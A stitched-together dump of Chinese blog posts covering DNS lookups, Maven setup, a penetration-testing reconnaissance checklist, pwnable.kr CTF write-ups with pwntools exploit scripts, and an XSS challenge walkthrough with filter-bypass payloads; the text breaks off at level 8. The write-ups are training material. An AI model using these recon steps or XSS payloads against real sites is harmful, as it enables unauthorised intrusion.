上面结果表示，查询域名math.stackexchange.com的A记录，A是address的缩写。 第三段是DNS服务器的答复。 上面结果显示，math.stackexchange.com有四个A记录，即四个IP地址。600是TTL值（Time to live 的缩写），表示缓存时间，即600秒之内不用重新查询。 第四段显示stackexchange.com的NS记录（Name Server的缩写），即哪些服务器负责管理stackexchange.com的DNS记录。 上面结果显示stackexchange.com共有四条NS记录，即四个域名服务器，向其中任一台查询就能知道math.stackexchange.com的IP地址是什么。 第五段是上面四个域名服务器的IP地址，这是随着前一段一起返回的。 第六段是DNS服务器的一些传输信息。 上面结果显示，本机的DNS服务器是192.168.1.253，查询端口是53（DNS服务器的默认端口），以及回应长度是305字节。 如果不想看到这么多内容，可以使用+short参数。 123456$ dig +short math.stackexchange.com151.101.129.69151.101.65.69151.101.193.69151.101.1.69 上面命令只返回math.stackexchange.com对应的4个IP地址（即A记录）。 三、DNS服务器下面我们根据前面这个例子，一步步还原，本机到底怎么得到域名math.stackexchange.com的IP地址。 首先，本机一定要知道DNS服务器的IP地址，否则上不了网。通过DNS服务器，才能知道某个域名的IP地址到底是什么。 DNS服务器的IP地址，有可能是动态的，每次上网时由网关分配，这叫做DHCP机制；也有可能是事先指定的固定地址。Linux系统里面，DNS服务器的IP地址保存在/etc/resolv.conf文件。 上例的DNS服务器是192.168.1.253，这是一个内网地址。有一些公网的DNS服务器，也可以使用，其中最有名的就是Google的8.8.8.8和Level 3的4.2.2.2。 本机只向自己的DNS服务器查询，dig命令有一个@参数，显示向其他DNS服务器查询的结果。 1$ dig @4.2.2.2 math.stackexchange.com 上面命令指定向DNS服务器4.2.2.2查询。 四、域名的层级DNS服务器怎么会知道每个域名的IP地址呢？答案是分级查询。 请仔细看前面的例子，每个域名的尾部都多了一个点。 比如，域名math.stackexchange.com显示为math.stackexchange.com.。这不是疏忽，而是所有域名的尾部，实际上都有一个根域名。 举例来说，www.example.com真正的域名是www.example.com.root，简写为www.example.com.。因为，根域名.root对于所有域名都是一样的，所以平时是省略的。 根域名的下一级，叫做”顶级域名”（top-level domain，缩写为TLD），比如.com、.net；再下一级叫做”次级域名”（second-level domain，缩写为SLD），比如www.example.com里面的.example，这一级域名是用户可以注册的；再下一级是主机名（host），比如www.example.com里面的www，又称为”三级域名”，这是用户在自己的域里面为服务器分配的名称，是用户可以任意分配的。 总结一下，域名的层级结构如下。 12345主机名.次级域名.顶级域名.根域名# 即host.sld.tld.root 五、根域名服务器DNS服务器根据域名的层级，进行分级查询。 需要明确的是，每一级域名都有自己的NS记录，NS记录指向该级域名的域名服务器。这些服务器知道下一级域名的各种记录。 所谓”分级查询”，就是从根域名开始，依次查询每一级域名的NS记录，直到查到最终的IP地址，过程大致如下。 从”根域名服务器”查到”顶级域名服务器”的NS记录和A记录（IP地址） 从”顶级域名服务器”查到”次级域名服务器”的NS记录和A记录（IP地址） 从”次级域名服务器”查出”主机名”的IP地址 仔细看上面的过程，你可能发现了，没有提到DNS服务器怎么知道”根域名服务器”的IP地址。回答是”根域名服务器”的NS记录和IP地址一般是不会变化的，所以内置在DNS服务器里面。 下面是内置的根域名服务器IP地址的一个例子。 上面列表中，列出了根域名（.root）的三条NS记录A.ROOT-SERVERS.NET、B.ROOT-SERVERS.NET和C.ROOT-SERVERS.NET，以及它们的IP地址（即A记录）198.41.0.4、192.228.79.201、192.33.4.12。 另外，可以看到所有记录的TTL值是3600000秒，相当于1000小时。也就是说，每1000小时才查询一次根域名服务器的列表。 目前，世界上一共有十三组根域名服务器，从A.ROOT-SERVERS.NET一直到M.ROOT-SERVERS.NET。 六、分级查询的实例dig命令的+trace参数可以显示DNS的整个分级查询过程。 1$ dig +trace math.stackexchange.com 上面命令的第一段列出根域名.的所有NS记录，即所有根域名服务器。 根据内置的根域名服务器IP地址，DNS服务器向所有这些IP地址发出查询请求，询问math.stackexchange.com的顶级域名服务器com.的NS记录。最先回复的根域名服务器将被缓存，以后只向这台服务器发请求。 接着是第二段。 上面结果显示.com域名的13条NS记录，同时返回的还有每一条记录对应的IP地址。 然后，DNS服务器向这些顶级域名服务器发出查询请求，询问math.stackexchange.com的次级域名stackexchange.com的NS记录。 上面结果显示stackexchange.com有四条NS记录，同时返回的还有每一条NS记录对应的IP地址。 然后，DNS服务器向上面这四台NS服务器查询math.stackexchange.com的主机名。 上面结果显示，math.stackexchange.com有4条A记录，即这四个IP地址都可以访问到网站。并且还显示，最先返回结果的NS服务器是ns-463.awsdns-57.com，IP地址为205.251.193.207。 七、NS 记录的查询dig命令可以单独查看每一级域名的NS记录。 12$ dig ns com$ dig ns stackexchange.com +short参数可以显示简化的结果。 12$ dig +short ns com$ dig +short ns stackexchange.com 八、DNS的记录类型域名与IP之间的对应关系，称为”记录”（record）。根据使用场景，”记录”可以分成不同的类型（type），前面已经看到了有A记录和NS记录。 常见的DNS记录类型如下。 （1） A：地址记录（Address），返回域名指向的IP地址。 （2） NS：域名服务器记录（Name Server），返回保存下一级域名信息的服务器地址。该记录只能设置为域名，不能设置为IP地址。 （3）MX：邮件记录（Mail eXchange），返回接收电子邮件的服务器地址。 （4）CNAME：规范名称记录（Canonical Name），返回另一个域名，即当前查询的域名是另一个域名的跳转，详见下文。 （5）PTR：逆向查询记录（Pointer Record），只用于从IP地址查询域名，详见下文。 一般来说，为了服务的安全可靠，至少应该有两条NS记录，而A记录和MX记录也可以有多条，这样就提供了服务的冗余性，防止出现单点失败。 CNAME记录主要用于域名的内部跳转，为服务器配置提供灵活性，用户感知不到。举例来说，facebook.github.io这个域名就是一个CNAME记录。 1234567$ dig facebook.github.io...;; ANSWER SECTION:facebook.github.io. 3370 IN CNAME github.map.fastly.net.github.map.fastly.net. 600 IN A 103.245.222.133 上面结果显示，facebook.github.io的CNAME记录指向github.map.fastly.net。也就是说，用户查询facebook.github.io的时候，实际上返回的是github.map.fastly.net的IP地址。这样的好处是，变更服务器IP地址的时候，只要修改github.map.fastly.net这个域名就可以了，用户的facebook.github.io域名不用修改。 由于CNAME记录就是一个替换，所以域名一旦设置CNAME记录以后，就不能再设置其他记录了（比如A记录和MX记录），这是为了防止产生冲突。举例来说，foo.com指向bar.com，而两个域名各有自己的MX记录，如果两者不一致，就会产生问题。由于顶级域名通常要设置MX记录，所以一般不允许用户对顶级域名设置CNAME记录。 PTR记录用于从IP地址反查域名。dig命令的-x参数用于查询PTR记录。 123456$ dig -x 192.30.252.153...;; ANSWER SECTION:153.252.30.192.in-addr.arpa. 3600 IN PTR pages.github.com. 上面结果显示，192.30.252.153这台服务器的域名是pages.github.com。 逆向查询的一个应用，是可以防止垃圾邮件，即验证发送邮件的IP地址，是否真的有它所声称的域名。 dig命令可以查看指定的记录类型。 123$ dig a github.com$ dig ns github.com$ dig mx github.com 九、其他DNS工具除了dig，还有一些其他小工具也可以使用。 （1）host 命令 host命令可以看作dig命令的简化版本，返回当前请求域名的各种记录。 12345678910111213$ host github.comgithub.com has address 192.30.252.121github.com mail is handled by 5 ALT2.ASPMX.L.GOOGLE.COM.github.com mail is handled by 10 ALT4.ASPMX.L.GOOGLE.COM.github.com mail is handled by 10 ALT3.ASPMX.L.GOOGLE.COM.github.com mail is handled by 5 ALT1.ASPMX.L.GOOGLE.COM.github.com mail is handled by 1 ASPMX.L.GOOGLE.COM.$ host facebook.github.comfacebook.github.com is an alias for github.map.fastly.net.github.map.fastly.net has address 103.245.222.133 host命令也可以用于逆向查询，即从IP地址查询域名，等同于dig -x &lt;ip&gt;。 123$ host 192.30.252.153153.252.30.192.in-addr.arpa domain name pointer pages.github.com. （2）nslookup 命令 nslookup命令用于互动式地查询域名记录。 123456789101112$ nslookup&gt; facebook.github.ioServer: 192.168.1.253Address: 192.168.1.253#53Non-authoritative answer:facebook.github.io canonical name = github.map.fastly.net.Name: github.map.fastly.netAddress: 103.245.222.133&gt; （3）whois 命令 whois命令用来查看域名的注册情况。 1$ whois github.com","link":"/2016/08/20/2016/DNS%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"},{"title":"Maven使用","text":"Maven是一个项目管理和综合工具，可以快速准确地同步开发依赖包. 还有一点是我喜欢的, 所有的依赖都存储在仓库中, 以前每写一个项目, lib下都可能要导入重复依赖包, 而现在只需要写几行xml。 而且可以清晰的发现重复造轮子这个东西。 Maven配置setting.xml配置1.首先去官网下载Maven2.解压Maven至某个文件夹下,为了防止不必要地麻烦,路径中请勿存在中文.笔者直接放在jdk一起,找起来方便 - -3.打开Maven/conf/settings.xml, 修改如下配置属性 找到这一段注释 12345&lt;!-- localRepository | The path to the local repository maven will use to store artifacts. | | Default: ${user.home}/.m2/repository--&gt; 明显看出, 默认仓库位于当前用户家目录下的.m2/repository.windows用户不会希望庞大的仓库在C盘, 如果你也是这样可以像我一样在注释下方配置如下: 1&lt;localRepository&gt;E:\\Library\\RepMaven&lt;/localRepository&gt; 找到第二个位置 123456789101112131415161718&lt;profile&gt; &lt;id&gt;jdk-1.4&lt;/id&gt; &lt;activation&gt; &lt;jdk&gt;1.4&lt;/jdk&gt; &lt;/activation&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;jdk14&lt;/id&gt; &lt;name&gt;Repository for JDK 1.4 builds&lt;/name&gt; &lt;url&gt;http://www.myhost.com/maven/jdk14&lt;/url&gt; &lt;layout&gt;default&lt;/layout&gt; &lt;snapshotPolicy&gt;always&lt;/snapshotPolicy&gt; &lt;/repository&gt; &lt;/repositories&gt;&lt;/profile&gt;--&gt; 明显看出, Maven这里的参照运行环境为jdk-1.4, 照葫芦画瓢配置我的jdk1.8: &lt;profile&gt; &lt;id&gt;jdk-1.8&lt;/id&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;jdk&gt;1.8&lt;/jdk&gt; &lt;/activation&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;maven.compiler.compilerVersion&gt;1.8&lt;/maven.compiler.compilerVersion&gt; &lt;/properties&gt; &lt;/profile&gt; 注意: 如果maven进行升级，那么所有的配置都会被清除，所以要提前复制和备份。 Maven的简单配置到这就差不多了.但是有必要补充一下Maven的相关知识.。 仓库姿势Maven仓库有两种, 远程仓库, 本地仓库.若本地没有依赖包, Maven将从远程仓库查找依赖包并同步到本地. 远程仓库又包含中央仓库,私人仓库类比于游戏的官服和私服. 官包含了绝大多数流行的开源Java构件，以及源码、作者信息、SCM、信息、许可证信息等。一般来说，简单的Java项目依赖的构件都可以在这里下载到 私服是一种特殊的远程仓库，它是架设在局域网内的仓库服务，私服代理广域网上的远程仓库，供局域网内的Maven用户使用。当Maven需要下载构件的时候，它从私服请求，如果私服上不存在该构件，则从外部的远程仓库下载，缓存在私服上之后，再为Maven的下载请求提供服务。我们还可以把一些无法从外部仓库下载到的构件上传到私服上。而且鉴于长城防火墙, 有时候下载外网依赖包贼慢, 所以配置一个国内私服还是不错的.如: 12345678910111213141516171819202122232425&lt;mirrors&gt; &lt;!-- 阿里云仓库 --&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/repositories/central/&lt;/url&gt; &lt;/mirror&gt; &lt;!-- 中央仓库1 --&gt; &lt;mirror&gt; &lt;id&gt;repo1&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt; &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt; &lt;/mirror&gt; &lt;!-- 中央仓库2 --&gt; &lt;mirror&gt; &lt;id&gt;repo2&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt; &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt; &lt;/mirror&gt;&lt;/mirrors&gt; eclipse部署其它地不多说,本人是eclipse爱好者,所以只说eclipse用法. Maven插件123456菜单栏 - Preferences - Maven - 1.Installations - add - 选择Maven的位置 - 确定 (自带的Maven不好)2.User Settings - Browser (选择配置好的settings)现在的eclipse基本上都自带Maven插件,如果没有就菜单栏 - Help - Install New Software - 装 - 装完再修改上面的配置 Maven使用快速配置hibernate环境 右键 - 新建Maven Project(勾选Create a simple project ), 打开项目中 pom.xml 如下 12345678910111213141516171819202122232425262728&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;JdbcDebug&lt;/groupId&gt; &lt;artifactId&gt;JdbcDebug&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;!-- 属性配置 --&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.38&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.hibernate&lt;/groupId&gt; &lt;artifactId&gt;hibernate-core&lt;/artifactId&gt; &lt;version&gt;4.3.11.Final&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 由于pom.xml继承setting.xml超类, 一些异于setting.xml的配置可以直接覆盖写入. 配置完成以后, 运行 Maven Install. 然后你发现有好几个命令, 话说都是干啥的呢, 这就要追溯一下mvn命令的作用了. 1234567mvn clean 清理mvn compile 编译主程序mvn test-compile 编译测试程序mvn test 执行测试mvn package 执行测试mvn install 安装依赖包mvn site 生成站点 可能大家觉得很麻烦, 并没有看到Maven的好处. 回想导包的时候: &lt;dependency&gt; &lt;groupId&gt;org.hibernate&lt;/groupId&gt; &lt;artifactId&gt;hibernate-core&lt;/artifactId&gt; &lt;version&gt;4.3.11.Final&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; Maven的坐标, 即结合每个参数的值确定一个依赖包以保证大家依赖包的环境相同. xml标签含义额,哪里不明白直接百度 scope 1.compile：默认值 他表示被依赖项目需要参与当前项目的编译，还有后续的测试，运行周期也参与其中，是一个比较强的依赖。打包的时候通常需要包含进去 2.test：依赖项目仅仅参与测试相关的工作，包括测试代码的编译和执行，不会被打包，例如：junit 3.runtime：表示被依赖项目无需参与项目的编译，不过后期的测试和运行周期需要其参与。与compile相比，跳过了编译而已。例如JDBC驱动，适用运行和测试阶段 4.provided：打包的时候可以不用包进去，别的设施会提供。事实上该依赖理论上可以参与编译，测试，运行等周期。相当于compile，但是打包阶段做了exclude操作 5.system：从参与度来说，和provided相同，不过被依赖项不会从maven仓库下载，而是从本地文件系统拿。需要添加systemPath的属性来定义路径 …","link":"/2017/08/13/2017/Maven%E4%BD%BF%E7%94%A8/"},{"title":"信息收集","text":"渗透之信息收集快速查询文档 站点资产所有域收集域名信息在线Whois 站长之家 爱站工具网 VirusTotal 备案信息查询 ICP备案查询网 天眼查 收集敏感信息 使用谷歌SEO 关键词 说 明 site 指定域名 inurl URL中存在的关键词 intext 网页正文中的关键词 filetype 指定文件类型 intitle 网页标题中的关键词 link link:baidu.com表示返回所有和baidu.com做了链接的URL info 查找指定站点的一些基本信息 cache 搜索谷歌里关于某些内容的缓存 通过返回数据包中包含的响应头、404页面等信息分析服务器、服务器脚本语言、使用的CMS等 通过Github查找相关敏感信息，如数据库连接信息、邮箱密码、uc-key、阿里osskey甚至源代码 乌云漏洞表查询历史漏洞，万一未完全修复呢 ### 子域挖掘查询工具：Layer子域名挖掘机、Sublist3r、subDomainBrute SEO枚举：利用site使用谷歌、百度枚举 DNSdumpster进行DNS侦察、在线DNS侦察搜索工具 CA枚举：利用SSL/TLS透明度进行枚举，crt.sh与censys 在线子域名爆破 子域名爆破网站 IP反查绑定域名网站 http://tool.chinaz.com/subdomain/ http://subdomain.chaxun.la C端查询、端口扫描查找真实IP判断 通过PING命令判断 通过在线网站17CE或站长工具进行全国多区域PING服务 识别 内部邮箱源，如果存在自己的邮箱系统 扫描测试文件，如phpinfo、test找寻IP 查找分站域名，主站由于访问量较大挂载CDN，但是分站应该没有，可以通过ping二级域名获取分站IP，很可能分站与主站不是一个IP但是在一个C段，缩小到了C段就好找了。 国外访问，通过国外在线代理网站 查询域名解析记录，通过网站NETCRAFT查询历史域名IP访问记录 网站的APP，可以利用Fiddler或Burp Suite抓取App请求查询IP 绕过CloudFlare查询IP，在线网站CloudFlareWatch对CloudFlare客户网站进行真实IP查询 验证 直接通过IP访问，使用工具进行IP端80、443、8080端口扫描，然后脚本逐一访问找到正确IP 收集端口信息Nmap、 IIS PUT Scaner、 无状态端口扫描Masscan、 ZMAP、 御剑高速TCP端口扫描工具 信息泄露整理指纹识别 BugScaner 云悉指纹 WhatWeb 敏感目录文件工具：DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py、Sensitivefilescan、Weakfilescan 在线：WebScan 社会工程学社工库、欺骗技术、心里学、人性的弱点、、、","link":"/2017/02/27/2017/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"title":"小白的PWN学习之路","text":"PWN入门第二式 目前的战略是, 在刷题过程中学习, 可以最快发现自己不足的地方, 哪里不会学习哪里, 慢慢发现知识的相对重要, 再结合做题去学习. 刷题开始在Play Game刷的第二题. collision 1234567891011121314151617181920212223242526272829303132col@ubuntu:~$ cat col.c #include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res;}int main(int argc, char* argv[]){ if(argc&lt;2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0;} 通过 C 代码我们发现程序的主要行为是, 判断输入的参数是否与hashcode相等.但是, 其中长度为20的字符数组被强转为int类型的数组.又因为char为1个字节, int为4个字节,所以转为长度为4的int数组.那么我们假设输入 2222 2222 2222 2222 22222 由ascii表 -&gt; 50D -&gt; 32H , 2222 -&gt; 32323232H -&gt; 842150450D = x(设未知数x)然后我们发现当五个数相加时, 一定会超过int的最大值 2147483647.当超过最大值, 数据溢出, 那么将做 -2147483648 运算.不如我们直接假设 输入的值转换为int值为 x ,越界次数为 t, n0 = 2147483647, n1 = 2147483648.那么x*5 - n0*t - (n1 + 1)*t = hashcode ==&gt; x = (hashcode + (n1 + n0 + 1)*t)/5(想想res突破int上界后, 掉到int下界, 然后是不是还有个0要越过,所以再+1)然后直接带入 t=1, 算出 x = 972620284D -&gt; 39f901fcH 直接写exploit吧 123456789#!/usr/bin/pythonfrom pwn import *import ospwn_ssh=ssh(host='pwnable.kr',user='col',password='guest',port=2222)print (pwn_ssh.connected())sh=pwn_ssh.process(argv=['collision','\\xfc\\x01\\xf9\\x39' * 5],executable='./col')print (sh.recvall()) 2018-02-27 13:14 ————————- 透明的分割线 ————————- PWN入门第一式准备活动熟话说，欲先善其事，必先利其器.请观看ETenal大佬的笔记来搭建环境. 在Play Game刷的第一题.萌新的我点开 fd 那个萌萌的粉红史莱姆. 12345Mommy! what is a file descriptor in Linux?* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VUssh fd@pwnable.kr -p2222 (pw:guest) 我们在ubuntu上输入,然后输入 密码 guest. 12345678910111213141516mzl@ubuntu:~$ ssh fd@pwnable.kr -p2222fd@pwnable.kr's password: ____ __ __ ____ ____ ____ _ ___ __ _ ____| \\| |__| || \\ / || \\ | | / _] | |/ ]| \\ | o ) | | || _ || o || o )| | / [_ | ' / | D )| _/| | | || | || || || |___ | _] | \\ | / | | | ` ' || | || _ || O || || [_ __ | \\| \\ | | \\ / | | || | || || || || || . || . \\|__| \\_/\\_/ |__|__||__|__||_____||_____||_____||__||__|\\_||__|\\_| - Site admin : daehee87.kr@gmail.com- IRC : irc.netgarage.org:6667 / #pwnable.kr- Simply type \"irssi\" command to join IRC now- files under /tmp can be erased anytime. make your directory under /tmp- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminalLast login: Sat Mar 3 23:53:04 2018 from *.*.*.* 首先我们来看一下都有些啥文件 12345fd@ubuntu:~$ ls -ltotal 16-r-sr-x--- 1 fd_pwn fd 7322 Jun 11 2014 fd-rw-r--r-- 1 root root 418 Jun 11 2014 fd.c-r--r----- 1 fd_pwn root 50 Jun 11 2014 flag 然后我们发现只有 fd.c 一个入口 12345678910111213141516171819202122fd@ubuntu:~$ cat fd.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0;} 函数:atoi (表示 ascii to integer)是把字符串转换成整型数的一个函数.strcmp(char str1, char str2) 若 str1 和 str2 字符串相同返回0. 重要函数：read | ssize_t read(int fd,void * buf ,size_t count);参数说明fd 的值有三种(都为int类型)当fd=0, read函数为标准输入流, 其他参数时, 1(标准输出流), 2(标准错误流).buf所指向的内存可以比喻为流的载具, count为载具的容量.务必再百度关键词 file descriptor, 查看官方描述. 所以我们需要让read为标准输入, 即使 fd=0, 又因为 fd = (输入的值) - 0x1234(转换为十进制为4660).故输入 4660, 然后再输入 LETMEWIN 再回车即可.演示如下: 1234fd@ubuntu:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!! 最后来一个python的exploit123456from pwn import *pwn_ssh=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)print (pwn_ssh.connected())sh=pwn_ssh.process(argv=['fd','4660'],executable='./fd')sh.sendline(\"LETMEWIN\")print (sh.recvall()) 在pwnable的刷题记录，虽然只刷了几题，总觉得这个领域还不适合现在的我。","link":"/2016/06/27/2016/%E5%B0%8F%E7%99%BD%E7%9A%84PWN%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"},{"title":"XSS小练习","text":"速刷了一个XSS挑战练习 WriteupLevel1 关键代码 123456789&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"name\"];echo \"&lt;h2 align=center&gt;欢迎用户\".$str.\"&lt;/h2&gt;\";?&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\";?&gt; 查看关键代码，我们可以看到代码将用户输入的name请求直接拼接到网页代码中，所以我们直接插入js脚本即可 payload1http://localhost/xsschallenge/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt; Level2 关键代码1234567891011121314&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=\"'.$str.'\"&gt;&lt;input type=submit name=submit value=\"搜索\"/&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\";?&gt; 可以看到这里使用双引号包装用户输入的keyword，然后放置在input标签中，所以我们先闭合引号，再闭合标签。 payload 1http://localhost/xsschallenge/level2.php?keyword=\"&gt;&lt;script&gt;alert(1)&lt;/script&gt; Level3 关键代码1234567891011121314&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".\"&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value='\".htmlspecialchars($str).\"'&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;\";?&gt;&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\";?&gt; 这里使用php内置函数htmlspecialchars来转义&gt; &lt; ' &quot; &amp;字符，但是我们知道需要设置ENT_NOQUOTES才会转义单引号，所以我们单引号闭合，然后使用onmouseover事件监听鼠标是否在此热区，当鼠标移动到热区，也就是这里的input标签上，就会触发弹窗。 payload 1http://localhost/xsschallenge/level3.php?keyword=' onmouseover='alert(1)' Level4 关键代码 12345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str2=str_replace(\"&gt;\",\"\",$str);$str3=str_replace(\"&lt;\",\"\",$str2);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=\"'.$str3.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str3).\"&lt;/h3&gt;\";?&gt; 这里str2和上一题一样，过滤&lt;对咱们影响不大。 payload 1http://localhost/xsschallenge/level4.php?keyword=” onmouseover=”alert(1)“ Level5 关键代码 12345678910111213141516&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=\"'.$str3.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str3).\"&lt;/h3&gt;\";?&gt; strtolower是将字符串中大写字母转为小写字母，然后我们看到代码将on转为o_n，script换为scr_ipt，这里我们不能直接使用script标签，也不能使用之前的监听事件了。不过，我们知道a标签的href也是可以执行js代码的，所以我们先将双引号闭合，然后闭合标签，然后使用href执行弹窗。 payload 1http://localhost/xsschallenge/level5.php?keyword=\"&gt;&lt;a href=javascript:alert(1) var=\" Level6 关键代码 12345678910111213141516171819&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);$str4=str_replace(\"src\",\"sr_c\",$str3);$str5=str_replace(\"data\",\"da_ta\",$str4);$str6=str_replace(\"href\",\"hr_ef\",$str5);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=\"'.$str6.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str6).\"&lt;/h3&gt;\";?&gt; 这里和上一题的差别在于把我们a标签执行代码的href也加入了黑名单，但是我们可以执行js的标签还有很多，同时这里没有使用将大写转小写，可以大小写绕过。这里我们使用img的，然后Src、Onerror绕过。 payload 1http://localhost/xsschallenge/level6.php?keyword=\"&gt;&lt;img Src=a Onerror=\"alert('a')\"&gt; Level7 关键代码 12345678910111213141516171819&lt;?php ini_set(\"display_errors\", 0);$str =strtolower( $_GET[\"keyword\"]);$str2=str_replace(\"script\",\"\",$str);$str3=str_replace(\"on\",\"\",$str2);$str4=str_replace(\"src\",\"\",$str3);$str5=str_replace(\"data\",\"\",$str4);$str6=str_replace(\"href\",\"\",$str5);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=\"'.$str6.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str6).\"&lt;/h3&gt;\";?&gt; 这里使用的过滤方式是，将敏感词置换为空，我们可以用双写绕过，如srsrcc，置换后的结果为src。所以poc如下： payload 1http://localhost/xsschallenge/level7.php?keyword=\"&gt;&lt;img ssrcrc=1 oonnerror=\"alert('a')\"&gt; Level8 关键代码 1234567891011121314151617181920212223&lt;?php ini_set(\"display_errors\", 0);$str = 